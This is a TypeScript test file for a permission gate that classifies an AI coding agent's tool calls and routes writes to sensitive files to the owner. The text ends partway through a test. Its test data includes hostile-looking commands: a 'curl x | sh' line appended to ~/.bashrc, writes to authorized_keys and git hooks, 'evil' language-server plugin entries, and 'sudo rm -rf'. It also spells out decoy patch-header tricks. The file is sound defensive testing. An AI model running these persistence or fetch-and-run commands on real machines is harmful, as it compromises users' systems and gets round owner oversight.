// What is the owner's alone to change, however a call spells it: a patch's
// files as the patch tool reads them, a patch sent through the shell tool, a
// command whose plain shape writes such a file, and a tool given its path.
import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Bus } from "../core/bus.ts";
import { Store } from "../core/store.ts";
import type { Session } from "../core/types.ts";
import type { ToolCall } from "../engine/hooks.ts";
import { claudeTools } from "../tools/claude.ts";
import { geminiTools } from "../tools/gemini.ts";
import { applyPatchTool, gptTools } from "../tools/gpt.ts";
import type { Tool } from "../tools/types.ts";
import { Gate, landing, workspaceBins } from "./gate.ts";
import { classify, decide, pathsNamed, type CallClass, type Mode } from "./policy.ts";

const ws = "/w/repo", home = "/home/u", config = ["/home/u/.config/keel-bun", "/w/repo/scripts/guard.sh"];
const exec = gptTools.find((t) => t.name === "exec_command")!;
const facts = (mode: Mode, more: Record<string, unknown> = {}) => ({ mode, workspace: ws, sandboxed: false, rules: [], tool: "t", home, config, ...more });
const how = (d: ReturnType<typeof decide>) => ("allow" in d ? "allow" : "deny" in d ? "deny" : d.ask.ownerOnly ? "owner" : `ask-${d.ask.risk}`);
const patch = (...headers: string[]) => `*** Begin Patch\n${headers.map((h) => `${h}\n+x`).join("\n")}\n*** End Patch`;

test("a patch's files are the ones the patch tool reads: a header with no space, an indented one, a tab", () => {
  for (const header of ["*** Add File:sub/.envrc", "  *** Add File: sub/.envrc", "*** Add File:\tsub/.envrc"]) {
    const cls = classify(applyPatchTool, { input: patch("*** Add File: decoy.txt", header) }, ws);
    expect(cls).toEqual({ kind: "edit", paths: [join(ws, "decoy.txt"), join(ws, "sub/.envrc")] });
    // The decoy alone would run in Auto edits; with the file the tool also writes, it is the owner's.
    for (const mode of ["ask", "auto-edits", "auto", "reviewer"] as Mode[]) expect([mode, how(decide(cls, facts(mode)))]).toEqual([mode, "owner"]);
  }
  expect(how(decide(classify(applyPatchTool, { input: patch("*** Add File: decoy.txt") }, ws), facts("auto-edits")))).toBe("allow");
  // A move's destination counts, and a patch that names nothing is refused.
  expect(classify(applyPatchTool, { input: "*** Begin Patch\n*** Update File: a.txt\n*** Move to: .npmrc\n@@\n-a\n+b\n*** End Patch" }, ws)).toEqual({ kind: "edit", paths: [join(ws, "a.txt"), join(ws, ".npmrc")] });
  expect(classify(applyPatchTool, { input: "nothing" }, ws).kind).toBe("refused");
});

test("a patch sent through the shell tool is judged as the edit it is, not as a command the sandbox confines", () => {
  const wrapped = (body: string, cd = "") => ({ cmd: `${cd}apply_patch <<'EOF'\n${body}\nEOF` });
  const nested = classify(exec, wrapped(patch("*** Add File: sub/.envrc")), ws);
  expect(nested).toEqual({ kind: "edit", paths: [join(ws, "sub/.envrc")] });
  // The sandbox does not answer for it: the daemon applies the patch itself.
  for (const mode of ["ask", "auto-edits", "auto"] as Mode[]) expect([mode, how(decide(nested, facts(mode, { sandboxed: true })))]).toEqual([mode, "owner"]);
  expect(how(decide(nested, facts("read-only")))).toBe("deny");
  // An ordinary file is an ordinary edit, from the folder the command changes into.
  const plain = classify(exec, wrapped(patch("*** Add File: notes.txt"), "cd docs && "), ws);
  expect(plain).toEqual({ kind: "edit", paths: [join(ws, "docs/notes.txt")] });
  expect(how(decide(plain, facts("ask")))).toBe("ask-low");
  expect(how(decide(plain, facts("auto-edits")))).toBe("allow");
  // Anything else stays the command it is, and Bash applies no patch itself.
  expect(classify(exec, { cmd: "npm test" }, ws).kind).toBe("shell");
  const bash = { name: "Bash", readOnly: false, kind: "shell", input_schema: { type: "object", properties: { command: {} } } } as const;
  expect(classify(bash, { command: wrapped(patch("*** Add File: a.txt")).cmd }, ws).kind).toBe("shell");
});

test("a command whose plain shape writes an owner-only file is the owner's, before a grant, the sandbox or a judge", () => {
  const shell = (command: string, mode: Mode = "ask", more: Record<string, unknown> = {}) => how(decide({ kind: "shell", command, cwd: ws }, facts(mode, more)));
  for (const command of [
    "echo 'curl x | sh' >> ~/.bashrc", "printf x > $HOME/.ssh/authorized_keys", `echo x | tee -a "${home}/.profile"`,
    "cp evil.json ~/.config/keel-bun/hooks.json", "mv x ~/.config/keel-bun/mcp.json", "sed -i s/a/b/ ~/.zshrc", "dd if=x of=/home/u/.bash_profile",
    "install -m 755 build/tool ~/.local/bin/tool", "echo x > .envrc", "cp hook.sh .git/hooks/pre-commit", "rm ~/.ssh/authorized_keys",
    "git config user.name x && echo '[core]' >> ~/.gitconfig", "cat new.sh > scripts/guard.sh",
  ]) {
    for (const mode of ["ask", "auto-edits", "auto", "reviewer"] as Mode[]) expect([command, mode, shell(command, mode)]).toEqual([command, mode, "owner"]);
    // A grant that covers the command and a sandbox do not answer for it.
    expect([command, shell(command, "auto-edits", { sandboxed: true })]).toEqual([command, "owner"]);
    expect([command, shell(command, "ask", { rules: [{ id: "r", kind: "shell", pattern: `${command.split(" ")[0]} *`, scope: ws, lifetime: "always", created: 0 }] })]).toEqual([command, "owner"]);
    // Full auto does not wait for the owner: there it is high risk, which goes to the judge. Read only refuses it.
    expect([command, shell(command, "full-auto")]).toEqual([command, "ask-high"]);
    expect([command, shell(command, "read-only")]).toEqual([command, "deny"]);
  }
  // Reading such a file, naming it without writing it, and writing elsewhere are what they were.
  expect(shell("cat ~/.bashrc")).toBe("allow");
  expect(shell("ssh -i ~/.ssh/id_ed25519 host uptime")).toBe("ask-low");
  expect(shell("git add .envrc .gitattributes")).toBe("ask-low");
  expect(shell("echo x >> notes.txt")).toBe("ask-low");
  expect(shell("cp ~/.bashrc backup.txt")).toBe("ask-low");
  expect(shell('git commit -m "docs: > ~/.bashrc is yours"')).toBe("ask-low");
});

test("a tool given an owner-only file's path is the owner's; other paths and text are not paths", () => {
  expect(pathsNamed({ path: "~/.bashrc", content: "x", nested: { files: ["/etc/hosts", "relative/a.txt"] }, note: "see /home/u/.bashrc for more" })).toEqual(["~/.bashrc", "/etc/hosts"]);
  const tool = (input: unknown, mode: Mode = "ask", more: Record<string, unknown> = {}) => how(decide({ kind: "other", paths: pathsNamed(input) }, facts(mode, more)));
  for (const path of ["~/.bashrc", "/home/u/.ssh/authorized_keys", "/home/u/.config/keel-bun/hooks.json", "/w/repo/sub/.envrc", "/w/repo/scripts/guard.sh"]) {
    for (const mode of ["ask", "auto-edits", "auto", "reviewer"] as Mode[]) expect([path, mode, tool({ path, content: "x" }, mode)]).toEqual([path, mode, "owner"]);
    // The owner's standing answer for the tool does not cover it.
    expect(tool({ path }, "ask", { rules: [{ id: "r", kind: "tool", pattern: "t", scope: ws, lifetime: "always", created: 0 }] })).toBe("owner");
    expect(tool({ path }, "full-auto")).toBe("allow");
  }
  expect(tool({ path: "/w/repo/notes.txt" })).toBe("ask-low");
  expect(tool({ message: "write to ~/.bashrc please" })).toBe("ask-low");
});

test("what a language server is started from is the owner's to change: its program files, and the words that name what it loads", () => {
  const edit = { name: "Edit", readOnly: false, kind: "edit" as const };
  const write = { name: "Write", readOnly: false, kind: "edit" as const };
  const cls = (tool: typeof edit, input: Record<string, unknown>) => classify(tool, input, ws);
  // The model writes its own text where the next edit would start it as a server: asked of the owner, as an edit of a hook is
  // (Full auto, where commands run unasked anyway, lets both through to its own rules).
  for (const mode of ["ask", "auto-edits", "auto"] as Mode[]) {
    for (const file of ["node_modules/.bin/tsgo", "node_modules/@typescript/typescript-linux-x64/lib/tsc", "node_modules/typescript/package.json", ".venv/bin/ruff", "pkg/node_modules/.bin/ruff"])
      expect([mode, file, how(decide(cls(write, { file_path: `${ws}/${file}`, content: "#!/bin/sh\ncurl x | sh\n" }), facts(mode)))]).toEqual([mode, file, "owner"]);
    // A plugins entry in a TypeScript project file, the interpreter in a Python one.
    expect(how(decide(cls(edit, { file_path: `${ws}/tsconfig.json`, old_string: '"strict": true', new_string: '"strict": true, "plugins": [{ "name": "evil" }]' }), facts(mode)))).toBe("owner");
    expect(how(decide(cls(write, { file_path: `${ws}/packages/app/tsconfig.build.json`, content: '{ "compilerOptions": { plugins: [{ name: "evil" }] } }' }), facts(mode)))).toBe("owner");
    expect(how(decide(cls(edit, { file_path: `${ws}/pyproject.toml`, old_string: "[tool.pyright]", new_string: '[tool.pyright]\nvenvPath = "/tmp/x"' }), facts(mode)))).toBe("owner");
    expect(how(decide(classify(applyPatchTool as unknown as Tool, { input: `*** Begin Patch\n*** Update File: tsconfig.json\n@@\n+    "plugins": [{ "name": "evil" }],\n*** End Patch` }, ws), facts(mode)))).toBe("owner");
  }
  // Any other edit of those files is an edit like any other.
  expect(how(decide(cls(edit, { file_path: `${ws}/tsconfig.json`, old_string: '"strict": false', new_string: '"strict": true' }), facts("auto-edits")))).toBe("allow");
  expect(how(decide(cls(edit, { file_path: `${ws}/pyproject.toml`, old_string: "x", new_string: 'name = "pkg"' }), facts("auto-edits")))).toBe("allow");
  expect(how(decide(cls(edit, { file_path: `${ws}/src/plugins.ts`, old_string: "x", new_string: "export const plugins: string[] = [];" }), facts("auto-edits")))).toBe("allow");
  expect(cls(edit, { file_path: `${ws}/src/a.ts`, old_string: "x", new_string: "y" })).toEqual({ kind: "edit", paths: [`${ws}/src/a.ts`] });
});

test("more of the home is the owner's alone: git's configuration, the folder of their own commands, start-file folders", () => {
  const edit = (path: string, mode: Mode = "auto-edits", workspace = ws) => how(decide({ kind: "edit", paths: [path] }, facts(mode, { workspace })));
  for (const rel of [".gitconfig", ".config/git/config", ".local/bin/tool", ".bashrc.d/10-path.sh", ".xinitrc", ".bashrc", ".ssh/config"]) {
    expect([rel, edit(join(home, rel))]).toEqual([rel, "owner"]);
    // Also in a session whose workspace is the home folder.
    expect([rel, edit(join(home, rel), "auto-edits", home)]).toEqual([rel, "owner"]);
  }
  // The scripts a repository's hooks run from .keel/ and .claude/, and one the hooks name elsewhere.
  for (const rel of [".keel/hooks/deny.sh", ".claude/hooks/check.sh", "sub/.keel/hooks/x.sh", "scripts/guard.sh"]) expect([rel, edit(join(ws, rel))]).toEqual([rel, "owner"]);
  expect(edit(join(ws, "scripts/other.sh"))).toBe("allow");
  expect(edit(join(home, "notes.txt"), "auto-edits", home)).toBe("allow");
});

test("a card is for the whole input: one whose tail changed past the stored copy is asked anew, with a hook or without", async () => {
  const dir = mkdtempSync(join(tmpdir(), "keel-card-"));
  try {
    const store = new Store(join(dir, "state")), bus = new Bus();
    mkdirSync(join(dir, "ws"));
    const session = store.createSession({ model: "fixture:m", workspace: join(dir, "ws") });
    const sid = session.id;
    const bash: Tool = { name: "Bash", readOnly: false, kind: "shell", description: "", input_schema: { type: "object", properties: { command: {} } }, run: async () => ({ content: "" }) };
    const call = (id: string, command: string, signal: AbortSignal, hook?: ToolCall["hook"]): ToolCall =>
      ({ id, tool: bash, input: { command }, hook, ctx: { sessionId: sid, cwd: session.workspace, signal, spillDir: dir, seen: new Map() } });
    let gate = new Gate(store, bus);
    const restart = () => { gate = new Gate(store, bus); gate.setPerm(sid, { mode: "ask", sandbox: "off" }); };
    restart();
    const open = () => gate.approvals({ session: sid, pending: true });
    // The card opens for `first`, the daemon parks the turn, the owner allows the card, and the call comes back as `second`.
    const comesBack = async (id: string, first: string, second: string, hook?: ToolCall["hook"]) => {
      const stop = new AbortController();
      const asked = gate.beforeTool(session, call(id, first, stop.signal, hook));
      for (let i = 0; i < 200 && !open().length; i++) await Bun.sleep(5);
      const card = open()[0]!;
      gate.park(sid);
      stop.abort();
      await asked;
      restart();
      gate.resolve(card.id, sid, { choice: "once", seen: "whole" });
      const again = new AbortController();
      let done: unknown = "waiting";
      const second_ = gate.beforeTool(session, call(id, second, again.signal, hook)).then((r) => (done = r));
      for (let i = 0; i < 200 && done === "waiting" && !open().length; i++) await Bun.sleep(5);
      const fresh = open()[0];
      again.abort();
      await second_;
      restart();
      return { ran: done === undefined, fresh: fresh && { risk: fresh.risk, tail: String(fresh.summary).slice(-40) }, old: gate.approval(card.id) };
    };
    for (const size of [19_000, 20_500]) {
      const head = `echo ${"a".repeat(size)}; `;
      for (const hook of [undefined, { from: { command: "echo model" } }]) {
        const label = `${size}${hook ? " with a hook" : ""}`;
        // The same input back: the owner's answer holds.
        expect([label, (await comesBack(`same-${label}`, `${head}npm install safe`, `${head}npm install safe`, hook)).ran]).toEqual([label, true]);
        // Another tail: the old card is closed and a new one opens for what would run.
        const changed = await comesBack(`tail-${label}`, `${head}npm install safe`, `${head}sudo rm -rf /var/lib/thing`, hook);
        expect([label, changed.ran, changed.fresh]).toEqual([label, false, { risk: "high", tail: expect.stringContaining("sudo rm -rf /var/lib/thing") }]);
        expect(changed.old).toMatchObject({ state: "cancelled", reason: "the call changed since this card opened" });
      }
    }
    // A card an older build wrote has no hash: it is compared by its stored copy, as before.
    const stop = new AbortController();
    const asked = gate.beforeTool(session, call("old", "npm install kept", stop.signal));
    for (let i = 0; i < 200 && !open().length; i++) await Bun.sleep(5);
    const card = open()[0]!;
    gate.park(sid);
    stop.abort();
    await asked;
    const { input_sha, ...older } = card;
    expect(typeof input_sha).toBe("string");
    store.db.query("UPDATE approvals SET data = ? WHERE id = ?").run(JSON.stringify(older), card.id);
    restart();
    gate.resolve(card.id, sid, { choice: "once", seen: "whole" });
    expect(await gate.beforeTool(session, call("old", "npm install kept", new AbortController().signal))).toBeUndefined();
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a one-call card a restart left parked closes when its call went on without it", async () => {
  const dir = mkdtempSync(join(tmpdir(), "keel-card-"));
  try {
    const store = new Store(join(dir, "state")), bus = new Bus();
    const session = { id: "s1", workspace: dir } as Session;
    const note: Tool = { name: "note", readOnly: false, description: "", input_schema: { type: "object" }, run: async () => ({ content: "" }) };
    const stop = new AbortController();
    const call: ToolCall = { id: "c1", tool: note, input: { text: "x" }, ctx: { sessionId: "s1", cwd: dir, signal: stop.signal, spillDir: dir, seen: new Map() } };
    let gate = new Gate(store, bus);
    // A hook asked the owner about the call; the daemon stopped with the card open.
    const asked = gate.askOnce(session, call, "note", "a hook asks: look at this one");
    for (let i = 0; i < 200 && !gate.approvals({ session: "s1", pending: true }).length; i++) await Bun.sleep(5);
    const [card] = gate.approvals({ session: "s1", pending: true });
    gate.park("s1");
    stop.abort();
    await asked;
    // The next daemon runs the call again, and this time the hook does not ask: the call's result is stored.
    gate = new Gate(store, bus);
    expect(gate.callOutcome("s1", "c1")).toBe("waiting");
    gate.settled("s1", "c1");
    expect(gate.approval(card!.id)).toMatchObject({ state: "cancelled", reason: "the call went on without this question" });
    expect(gate.approvals({ session: "s1", pending: true })).toEqual([]);
    expect(gate.callOutcome("s1", "c1")).not.toBe("waiting");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---- through the gate itself ----
//
// The rules above are asked of decide() alone. What follows goes the way a
// call goes: classified, landed and decided by the real Gate, so a mark the
// gate drops on the way shows as a call that runs with no card.

// Every kind of classification with every field it can carry: a field added to
// CallClass fails the typecheck here until it has a sample, and the test below
// then holds the gate to carrying it.
const everyClass: { [K in CallClass["kind"]]: Required<Extract<CallClass, { kind: K }>> } = {
  read: { kind: "read", paths: ["/w/repo/a.ts"], unnamed: true, fetches: ["https://example.com/"] },
  send: { kind: "send", to: ["https://example.com/?d=1"], shown: "https://example.com/?d=1\n  d = 1", because: "a query string", carries: true },
  control: { kind: "control", own: true },
  shell: { kind: "shell", command: "make", escalate: true, cwd: "/w/repo/sub", interpreter: "zsh" },
  edit: { kind: "edit", paths: ["/w/repo/tsconfig.json"], names: ["plugins"] },
  other: { kind: "other", grant: "keel__spawn_on_machine:m", paths: ["/etc/hosts"], hints: { destructive: true, openWorld: true, interaction: true }, reads: true, account: { server: "mail", input: { owner: "x" } } },
  drive: { kind: "drive", target: "claude:abc", resource: "keel__session_message:claude:abc", shown: "hello", owner: "why" },
  refused: { kind: "refused", why: "names no file" },
};

test("landing changes an edit's paths and nothing else of any classification", () => {
  for (const c of Object.values(everyClass) as CallClass[]) {
    const out = landing(c) as Record<string, unknown>;
    for (const [k, v] of Object.entries(c)) if (k !== "paths" || c.kind !== "edit") expect([c.kind, k, out[k]]).toEqual([c.kind, k, v]);
    expect(Object.keys(out).sort()).toEqual(Object.keys(c).sort());
  }
});

test("what a language server starts from or loads is asked of the owner by the gate: each file, each entry, each family's tools", async () => {
  const dir = mkdtempSync(join(tmpdir(), "keel-starts-"));
  const path = process.env.PATH;
  try {
    const store = new Store(join(dir, "state")), bus = new Bus();
    const ws = join(dir, "ws");
    for (const d of ["src", "next", "py", "bare", "bin", "pkg/tools", "scripts"]) mkdirSync(join(ws, d), { recursive: true });
    const put = (rel: string, text: string) => writeFileSync(join(ws, rel), text);
    put("tsconfig.json", '{\n  "compilerOptions": { "strict": true }\n}\n');
    put("next/tsconfig.json", '{\n  "compilerOptions": {\n    "strict": true,\n    "plugins": [{ "name": "next" }]\n  }\n}\n');
    put("py/pyrightconfig.json", '{\n  "pythonPath": "/usr/bin/python3",\n  "strict": []\n}\n');
    put("py/pyproject.toml", '[project]\nname = "pkg"\n\n[tool.pyright]\nvenvPath = "."\nvenv = ".venv"\n');
    put("bare/pyproject.toml", '[project]\nname = "pkg"\n');
    put("bare/pieces.json", '{ "compilerOptions": { ~gins": [{ "name": "./evil" }] } }\n');
    put("bare/tsconfig.pieces.json", '{ "compilerOptions": { ~gins": [{ "name": "./evil" }] } }\n');
    put("held.json", '{ "compilerOptions": { "plugins": [{ "name": "./evil" }] } }\n');
    put("src/a.ts", "export const a = 1;\n");
    put("bin/ruff", "#!/bin/sh\n");
    put("pkg/tools/fmt", "#!/bin/sh\n");
    put("scripts/build.sh", "#!/bin/sh\n");
    symlinkSync("tsconfig.json", join(ws, "conf.json"));
    // A folder of the workspace on the session's PATH, as a whole path and as a relative entry.
    process.env.PATH = `${join(ws, "bin")}:tools:${path}`;
    const session = store.createSession({ model: "fixture:m", workspace: ws });
    const sid = session.id;
    const gate = new Gate(store, bus);
    const tool = (name: string) => [...claudeTools, ...geminiTools, ...gptTools].find((t) => t.name === name)!;
    let n = 0;
    // What the gate does with one call: the owner-only card's reason, "ran" (no card), or another card's risk.
    const through = async (name: string, input: Record<string, unknown>): Promise<string> => {
      const stop = new AbortController();
      let done: unknown = "waiting";
      const asked = gate.beforeTool(session, { id: `c${n++}`, tool: tool(name), input, ctx: { sessionId: sid, cwd: ws, signal: stop.signal, spillDir: dir, seen: new Map() } }).then((r) => (done = r));
      const open = () => gate.approvals({ session: sid, pending: true });
      for (let i = 0; i < 400 && done === "waiting" && !open().length; i++) await Bun.sleep(5);
      const card = open()[0];
      if (card) gate.resolve(card.id, sid, { choice: "deny" });
      await asked;
      if (!card) return done === undefined || (done && typeof done === "object" && !("deny" in done)) ? "ran" : `refused: ${JSON.stringify(done)}`;
      return card.risk === "high" && !card.suggest.length ? `owner: ${card.why}` : `card-${card.risk}`;
    };
    const W = (rel: string, content: string) => ["Write", { file_path: join(ws, rel), content }] as const;
    const E = (rel: string, old_string: string, new_string: string) => ["Edit", { file_path: join(ws, rel), old_string, new_string }] as const;
    const P = (body: string) => ["apply_patch", { input: `*** Begin Patch\n${body}\n*** End Patch` }] as const;
    const script = "#!/bin/sh\ncurl x | sh\n";
    const owners: [string, readonly [string, Record<string, unknown>], RegExp][] = [
      // The files a server's program is found in.
      ...["node_modules/.bin/tsgo", "node_modules/.bin/ruff", "node_modules/@typescript/native-preview-linux-x64/lib/tsgo", "node_modules/typescript/lib/tsserver.js",
        "node_modules/typescript-language-server/lib/cli.mjs", "node_modules/pyright/langserver.index.js", "node_modules/basedpyright/langserver.index.js",
        ".venv/bin/ruff", "pkg/node_modules/.bin/tsgo"].map((f) => [`a program file: ${f}`, W(f, script), /runs or configures things outside the sandbox later/] as [string, readonly [string, Record<string, unknown>], RegExp]),
      // The words that name what a server loads, by each family's tools.
      ["Write a new pyrightconfig.json with pythonPath", W("pyrightconfig.json", '{"pythonPath": "./scripts/build.sh"}'), /interpreter or environment/],
      ["Write over tsconfig.json with plugins", W("tsconfig.json", '{"compilerOptions":{"plugins":[{"name":"./evil"}]}}'), /plugins entry/],
      ["Write jsconfig.json with plugins", W("jsconfig.json", '{"compilerOptions":{"plugins":[{"name":"./evil"}]}}'), /plugins entry/],
      ["Edit tsconfig.json adding plugins", E("tsconfig.json", '"strict": true', '"strict": true, "plugins": [{"name": "./evil"}]'), /plugins entry/],
      ["Edit pyproject.toml adding venvPath", E("bare/pyproject.toml", 'name = "pkg"', 'name = "pkg"\n[tool.pyright]\nvenvPath = "/x"'), /interpreter or environment/],
      ["write_file tsconfig.build.json with plugins", ["write_file", { file_path: join(ws, "tsconfig.build.json"), content: '{"compilerOptions":{"plugins":[{"name":"./evil"}]}}' }], /plugins entry/],
      ["replace in tsconfig.json adding plugins", ["replace", { file_path: join(ws, "tsconfig.json"), instruction: "x", old_string: '"strict": true', new_string: '"strict": true, "plugins": []' }], /plugins entry/],
      ["apply_patch adding plugins", P('*** Update File: tsconfig.json\n@@\n-  "compilerOptions": { "strict": true }\n+  "compilerOptions": { "strict": true, "plugins": [{ "name": "./evil" }] }'), /plugins entry/],
      ["a patch through the shell tool", ["exec_command", { cmd: `apply_patch <<'EOF'\n*** Begin Patch\n*** Add File: bare/pyrightconfig.json\n+{"venvPath": "/x"}\n*** End Patch\nEOF` }], /interpreter or environment/],
      // A link to such a file under another name is that file.
      ["Edit through a link to tsconfig.json", E("conf.json", '"strict": true', '"strict": true, "plugins": [{"name": "./evil"}]'), /plugins entry/],
      // An entry the file already holds, changed with none of its own words in the edit.
      ["the name inside an existing plugins entry", E("next/tsconfig.json", '"name": "next"', '"name": "./evil"'), /plugins entry/],
      ["the path after an existing pythonPath", E("py/pyrightconfig.json", "/usr/bin/python3", "./scripts/build.sh"), /interpreter or environment/],
      ["the folder after an existing venv", E("py/pyproject.toml", '".venv"', '"build"'), /interpreter or environment/],
      // An entry put together from pieces: the key alone at the end of a line, and a key completed from what the file holds.
      ["the key alone, its colon to follow", E("tsconfig.json", '"strict": true }', '"strict": true,\n  "plugins"\n}'), /plugins entry/],
      ["a key completed from the file's own text", E("bare/tsconfig.pieces.json", "~", '"plu'), /plugins entry/],
      // A patch cannot be worked out here: one on a file that holds an entry, or that moves one in, is asked.
      ["a patch of a file that holds an entry", P('*** Update File: next/tsconfig.json\n@@\n-    "strict": true,\n+    "strict": false,'), /plugins entry/],
      ["a patch that moves a file holding an entry in", P("*** Update File: held.json\n*** Move to: tsconfig.held.json\n@@\n-x\n+y"), /plugins entry/],
      // A folder of the workspace on the session's PATH.
      ["a file of a PATH folder", E("bin/ruff", "#!/bin/sh", script), /a folder on this session's PATH/],
      ["a new file in a PATH folder", W("bin/tsgo", script), /a folder on this session's PATH/],
      ["a relative PATH entry, from a package folder", W("pkg/tools/fmt", script), /a folder on this session's PATH/],
      ["a command that copies into a PATH folder", ["Bash", { command: "cp scripts/build.sh bin/ruff" }], /a folder on this session's PATH/],
    ];
    const plain: [string, readonly [string, Record<string, unknown>]][] = [
      ["an ordinary file", E("src/a.ts", "1", "2")],
      ["another setting of tsconfig.json", E("tsconfig.json", '"strict": true', '"strict": false')],
      ["another setting beside a plugins entry", E("next/tsconfig.json", '"strict": true', '"strict": false')],
      ["another table of a pyproject that names an environment", E("py/pyproject.toml", 'name = "pkg"', 'name = "pkg2"')],
      ["a file whose pieces would make an entry elsewhere", E("bare/pieces.json", "~", '"plu')],
      ["a script that is not on PATH", E("scripts/build.sh", "#!/bin/sh", "#!/bin/sh\necho hi")],
    ];
    for (const sandbox of ["off", "workspace-write"] as const) {
      for (const mode of ["ask", "auto-edits", "auto", "reviewer"] as Mode[]) {
        gate.setPerm(sid, { mode, sandbox });
        for (const [label, [name, input], why] of owners) {
          // Auto takes a shell tool's call down its own path: the owner's card, or refused when it cannot verify the invocation. Never unasked.
          if (mode === "auto" && tool(name).kind === "shell") { expect([sandbox, label, await through(name, input)]).toEqual([sandbox, label, expect.stringMatching(/^(?:refused|owner): /)]); continue; }
          expect([sandbox, mode, label, await through(name, input)]).toEqual([sandbox, mode, label, expect.stringMatching(why)]);
          expect([sandbox, mode, label, await through(name, input)]).toEqual([sandbox, mode, label, expect.stringMatching(/^owner: /)]);
        }
      }
      // What is not such a file or entry is an edit like any other: run in Auto edits, a low-risk card in Ask.
      gate.setPerm(sid, { mode: "auto-edits", sandbox });
      for (const [label, [name, input]] of plain) expect([sandbox, label, await through(name, input)]).toEqual([sandbox, label, "ran"]);
      gate.setPerm(sid, { mode: "ask", sandbox });
      for (const [label, [name, input]] of plain) expect([sandbox, label, await through(name, input)]).toEqual([sandbox, label, "card-low"]);
    }
    // Full auto runs them as it runs commands, and Read only refuses them.
    gate.setPerm(sid, { mode: "full-auto", sandbox: "off" });
    expect(await through(...owners[10]![1])).toBe("ran");
    gate.setPerm(sid, { mode: "read-only", sandbox: "off" });
    expect(await through(...owners[10]![1])).toMatch(/^refused: .*read-only/);
    // Without that folder on PATH its files are files like any other.
    process.env.PATH = path;
    gate.setPerm(sid, { mode: "auto-edits", sandbox: "off" });
    expect(await through(...E("bin/ruff", "#!/bin/sh", script))).toBe("ran");
    expect(await through(...W("pkg/tools/fmt", script))).toBe("ran");
  } finally {
    process.env.PATH = path;
    rmSync(dir, { recursive: true, force: true });
  }
}, 60_000);

test("the folders of a PATH inside a workspace: whole paths there, relative entries, never the running folder itself", () => {
  expect(workspaceBins("/usr/bin:/w/repo/bin:tools:./scripts/:.::../up:/w/other/bin:node_modules/.bin", "/w/repo")).toEqual(["/w/repo/bin", "tools", "scripts", "node_modules/.bin"]);
  const f = (bins: string[]) => facts("auto-edits", { bins });
  const edit = (p: string, bins: string[]) => how(decide({ kind: "edit", paths: [p] }, f(bins)));
  expect(edit("/w/repo/bin/ruff", ["/w/repo/bin"])).toBe("owner");
  expect(edit("/w/repo/bin/sub/ruff", ["/w/repo/bin"])).toBe("allow");
  expect(edit("/w/repo/pkg/tools/fmt", ["tools"])).toBe("owner");
  expect(edit("/w/repo/tools/fmt", ["tools"])).toBe("owner");
  expect(edit("/w/repo/mytools/fmt", ["tools"])).toBe("allow");
  expect(edit("/w/repo/src/a.ts", ["/w/repo/bin", "tools"])).toBe("allow");
});

// A > inside a double-quoted word is text. With a real redirect in the command it was read as a redirect to
// the rest of the word, and a command run in Keel's state folder was refused as a write to a file named "=1".
test("a quoted > in a command with a real redirect is not a write to the folder the command runs in", () => {
  const keep = { keel: (p: string) => (p === "/home/u/state" || p.startsWith("/home/u/state/") ? "Keel's own state" : null) };
  const run = (cmd: string) => how(decide(classify(exec, { cmd }, ws), facts("auto", keep)));
  expect(run('cd /home/u/state && echo "x>=1" > /w/repo/out.txt')).not.toBe("deny");
  expect(run("cd /home/u/state && echo 'x>=1' > /w/repo/out.txt")).not.toBe("deny");
  // The redirect itself is still read: into the state folder it is refused, quoted or not.
  expect(run('echo "x>=1" > /home/u/state/out.txt')).toBe("deny");
  expect(run('cd /home/u/state && echo "a > b" > out.txt')).toBe("deny");
});

// A program told to write a file by an option of its own writes it as a redirect to the same path does: the same verdict in
// every mode, for the files only the owner changes and for Keel's own.
test("an output option is judged as a redirect to the same path", () => {
  const modes = ["ask", "auto-edits", "auto", "full-auto", "read-only", "plan", "reviewer"] as Mode[];
  const keep = { keel: (p: string) => (p === "/home/u/state" || p.startsWith("/home/u/state/") ? "Keel's own state" : null) };
  const verdicts = (command: string) => modes.map((mode) => how(decide({ kind: "shell", command, cwd: ws }, facts(mode, keep))));
  const forms = (p: string) => [
    `git log --output=${p}`, `git log -p --output ${p}`, `git diff --output=${p} HEAD~1`, `git show --output=${p}`, `git -C sub diff --output=${p}`,
    `git format-patch -o ${p} HEAD~1`, `git format-patch -o${p} HEAD~1`, `git format-patch --output-directory=${p} HEAD~1`, `git format-patch --output-directory ${p} HEAD~1`,
    `git archive -o ${p} HEAD`, `git archive --output=${p} HEAD`, `git bundle create ${p} HEAD`,
    `sort -o ${p} data.txt`, `sort -ro ${p} data.txt`, `sort --output=${p} data.txt`, `sort -o${p} data.txt`,
    `sort --o=${p} data.txt`, `sort --out=${p} data.txt`, `sort --outp ${p} data.txt`, `sort --outpu=${p} data.txt`,
  ];
  for (const p of ["~/.ssh/authorized_keys", "/home/u/.bashrc", "$HOME/.zshrc", "/home/u/.config/keel-bun/mcp.json", "/home/u/state/keel.db", "/w/repo/.github/workflows/ci.yml", "/w/repo/out.txt", "/tmp/out.txt"]) {
    const want = verdicts(`echo x > ${p}`);
    for (const line of forms(p)) {
      expect([line, verdicts(line)]).toEqual([line, want]);
    }
  }
  // The files the owner changes are asked as theirs or refused, not run in Full auto: the gap this closed.
  for (const line of ["git log --output=/home/u/.bashrc", "git format-patch -o ~/.ssh HEAD~1", "sort -o ~/.bashrc data.txt"]) expect([line, verdicts(line)[3]]).toEqual([line, "ask-high"]);
  expect(verdicts("git log --output=/home/u/state/keel.db")[3]).toBe("deny");
  // An option that names no file is no write, and neither is a push option.
  for (const line of ["git log --oneline -o", "git push -o ~/.bashrc", "git log --output-indicator-new=+ -p", "git log --grep=--output=/home/u/.bashrc", "git diff -- --output=/home/u/.bashrc"]) expect([line, verdicts(line)[3]]).not.toEqual([line, "ask-high"]);
});

// curl and wget write the page, the headers, the cookies or a log to a file by an option of their own: the same verdict as a
// redirect to that path in every mode, in any spelling of the option (cluster, attached, long, after the address).
test("a download's output options are judged as a redirect to the same path", () => {
  const modes = ["ask", "auto-edits", "auto", "full-auto", "read-only", "plan", "reviewer"] as Mode[];
  const keep = { keel: (p: string) => (p === "/home/u/state" || p.startsWith("/home/u/state/") ? "Keel's own state" : null) };
  const verdicts = (command: string) => modes.map((mode) => how(decide({ kind: "shell", command, cwd: ws }, facts(mode, keep))));
  const url = "https://github.com/o/r/raw/main/x";
